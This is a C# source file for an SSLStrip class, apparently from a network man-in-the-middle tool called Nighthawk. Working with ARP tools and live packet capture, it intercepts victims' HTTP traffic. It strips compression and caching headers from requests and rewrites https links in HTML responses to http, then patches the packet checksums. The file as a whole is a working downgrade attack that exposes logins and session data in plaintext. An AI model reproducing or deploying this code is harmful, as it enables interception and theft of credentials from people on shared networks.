using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using PacketDotNet;
using SharpPcap;

namespace Nighthawk
{
    public class SSLStrip
    {
        // current device
        private LivePcapDevice device;

        // status
        public bool Started = false;

        // exclusion
        private bool excludeLocalIP = false;
        private DeviceInfo deviceInfo;

        // access to ARPTools
        private ARPTools arpTools;

        // regex 
        private Regex regexEncoding = new Regex(@"Accept-Encoding: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexType = new Regex(@"(GET|POST) (.*?) HTTP\/1\.(0|1)", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexCType = new Regex(@"Content-Type: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);

        // encoding converter
        private static Encoding encodingAscii = Encoding.GetEncoding(1251);
        private static UTF8Encoding encodingUtf8 = new UTF8Encoding();

        // constructor
        public SSLStrip(LivePcapDevice device)
        {
            // store our network interface
            this.device = device;
        }

        // start SSL strip
        public void Start(bool excludeLocalIP, DeviceInfo deviceInfo, ARPTools arpTools)
        {
            // set
            this.excludeLocalIP = excludeLocalIP;
            this.deviceInfo = deviceInfo;
            this.arpTools = arpTools;

            // change status
            Started = true;
        }

        // stop SSL strip
        public void Stop()
        {
            // change status
            Started = false;
        }

        // process packet (true/false to prevent from routing it)
        public void ProcessPacket(Packet rawPacket, TcpPacket packet)
        {
            var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress.ToString();
            var destIP = (packet.ParentPacket as IpPacket).DestinationAddress.ToString();

            // exclusion of local IP
            if (excludeLocalIP && (sourceIP == deviceInfo.IP || destIP == deviceInfo.IP)) return;

            // check payload
            if (packet.PayloadData == null) return;
            
            // decode content
            var data = encodingUtf8.GetString(packet.PayloadData);
            
            if (data != string.Empty)
            {
                var changed = false;
                var matches = SimpleRegex.GetMatches(regexType, data);

                // client request
                if (matches.Count > 2)
                {
                    // check for images
                    if (matches[2].Contains(".png") || matches[2].Contains(".jpg") || matches[2].Contains(".gif")) return;

                    if (data.IndexOf("Accept-Encoding:") != -1)
                    {
                        // replace Accept-encoding (prevent unreadable data)
                        var diff = data.Length - regexEncoding.Replace(data, "Accept-Encoding: \r\n").Length;

                        var extra = string.Empty;

                        for (int i = 0; i < diff; i++)
                        {
                            extra += " ";
                        }

                        data = regexEncoding.Replace(data, "Accept-Encoding: "+ extra +"\r\n");

                        changed = true;
                    }

                    if (data.IndexOf("If-Modified-Since:") != -1)
                    {
                        DateTime time = new DateTime(1990, 1, 1);
                        
                        data = regexModified.Replace(data, "If-Modified-Since: "+ time.ToString("R") +"\r\n");
                        changed = true;
                    }
                }
                // server response
                else
                {
                    // check for html tags
                    if (!(data.Contains("<form") || data.Contains("<input") || data.Contains("<a ") || data.Contains("</a>") || data.Contains("</div>") || data.Contains("<meta"))) return;

                    var cmatches = SimpleRegex.GetMatches(regexCType, data);

                    // check for images
                    if (cmatches.Count > 1 && cmatches[1].Contains("image")) return;

                    if (data.IndexOf("\"https://") != -1)
                    {
                        data = data.Replace("\"https://", "\"http://");
                        changed = true;
                    }

                    if (data.IndexOf("'https://") != -1)
                    {
                        data = data.Replace("'https://", "'http://");
                        changed = true;
                    }
                }
                
                if (changed)
                {
                    // re-pack data
                    var bytes = encodingUtf8.GetBytes(data);

                    var diff = packet.PayloadData.Length - bytes.Length;

                    packet.PayloadData = bytes;
                    packet.UpdateTCPChecksum();

                    var ip = (packet.ParentPacket as IPv4Packet);
                    ip.TotalLength = ip.HeaderLength + packet.Bytes.Length;
                    ip.PayloadLength = (ushort)packet.Bytes.Length;
                    ip.Checksum = ip.Checksum + diff; // dirty checksum fix
                }
            }
        }
    }
}
